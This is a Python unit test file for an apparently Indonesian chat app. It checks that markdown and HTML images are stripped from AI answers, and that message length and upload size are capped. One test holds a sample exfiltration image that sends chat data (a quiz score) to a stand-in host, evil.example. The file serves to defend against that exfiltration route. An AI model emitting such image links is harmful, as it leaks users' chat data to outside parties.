import ast
import re
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SOURCE = (ROOT / "app.py").read_text(encoding="utf-8")
TREE = ast.parse(SOURCE)


def load(*names):
    namespace = {"re": re}
    nodes = [
        node for node in TREE.body
        if (isinstance(node, ast.FunctionDef) and node.name in names)
        or (isinstance(node, ast.Assign) and getattr(node.targets[0], "id", None) in names)
    ]
    exec(compile(ast.Module(body=nodes, type_ignores=[]), "app.py", "exec"), namespace)
    return namespace


APP = load("MARKDOWN_IMAGE", "IMAGE_REMOVED", "strip_markdown_images", "MAX_MESSAGE_CHARS")
strip = APP["strip_markdown_images"]


class StripMarkdownImagesTest(unittest.TestCase):

    def test_inline_image_cannot_send_chat_data(self):
        text, removed = strip("Ringkasan ![x](https://evil.example/c?d=nilai%20kuis%2080) selesai.")
        self.assertEqual((text, removed), ("Ringkasan [gambar dihapus] selesai.", 1))

    def test_every_image_form_is_removed(self):
        cases = {
            "title and parentheses": '![a](https://e.example/a_(b).png "judul")',
            "reference": "![a][1]",
            "shortcut": "![logo]",
            "empty alt": "![](https://e.example/p.gif)",
            "html": '<IMG SRC="https://e.example/p.gif" alt="">',
        }
        for name, image in cases.items():
            with self.subTest(form=name):
                text, removed = strip(f"a {image} b")
                self.assertEqual(text, "a [gambar dihapus] b")
                self.assertEqual(removed, 1)

    def test_links_and_text_stay(self):
        answer = "Sumber:\n[1] [Kemendikbud](https://kemendikbud.go.id) — hebat! [2] catatan"
        self.assertEqual(strip(answer), (answer, 0))

    def test_answers_are_cleaned_on_arrival_and_on_display(self):
        self.assertIn("answer, removed = strip_markdown_images(answer)", SOURCE)
        self.assertIn('security_event("answer_image_removed", id=request_id, count=removed)', SOURCE)
        self.assertIn('strip_markdown_images(message["content"])[0]', SOURCE)


class InputLimitsTest(unittest.TestCase):

    def test_long_messages_are_refused_in_the_browser_and_on_the_server(self):
        self.assertEqual(APP["MAX_MESSAGE_CHARS"], 10_000)
        self.assertIn("max_chars=MAX_MESSAGE_CHARS,", SOURCE)
        self.assertIn("if len(typed_text) > MAX_MESSAGE_CHARS:", SOURCE)
        self.assertIn('security_event("message_too_long", length=len(typed_text))', SOURCE)

    def test_uploads_are_capped_before_the_app_reads_them(self):
        config = (ROOT / ".streamlit" / "config.toml").read_text(encoding="utf-8")
        server = config.split("[server]", 1)[1].split("\n[", 1)[0]
        self.assertRegex(server, r"(?m)^maxUploadSize = 25$")


if __name__ == "__main__":
    unittest.main()
